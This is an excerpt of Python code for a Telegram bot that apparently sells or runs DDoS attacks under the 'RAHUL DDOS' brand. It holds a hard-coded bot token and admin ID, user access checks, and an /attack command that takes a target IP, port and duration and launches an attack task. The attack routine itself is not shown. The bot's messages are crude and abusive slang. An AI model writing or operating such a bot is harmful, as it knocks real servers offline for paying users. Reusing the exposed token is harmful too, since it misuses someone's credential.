...
TELEGRAM_BOT_TOKEN = '7854325693:AAGbjkFLcklLQjW7WDO2hEgYSwvcOIHYjpc'
ADMIN_USER_ID = 7962308718
...
async def start(update: Update, context: CallbackContext):
    ...
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*access kon tera baap lega lode @RAHUL_DDOS_B! /get_id*", parse_mode='Markdown')
        return
    message = (
       "*WELCOME 🤗 TO RAHUL DDOS WORLD *\n\n"
        "*💀Use /attack <ip> <port> <duration>*\n"
        "*💀sever ki chudayi @RAHUL_DDOS_B 🚀*" 
    )
...
async def attack(update: Update, context: CallbackContext):
    ...
    try:
        ...
        if duration > 300:  # New duration limit
            response = "*ruk madharcod 🥵300 ka lgale lode.*" 
    ...
    await context.bot.send_message(
        ...
        f"*🔥chudai chalu h feedback bhej dena @RAHUL_DDOS_B💥*"
    ), parse_mode='Markdown')

    # Run attack asynchronously
    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))
    
async def RAHUL_DDOS_B(update: Update, context: CallbackContext):
    user_id = update.effective_user.id 
...
def main():
    ...
    application.add_handler(CommandHandler("get_id", RAHUL_DDOS_B))
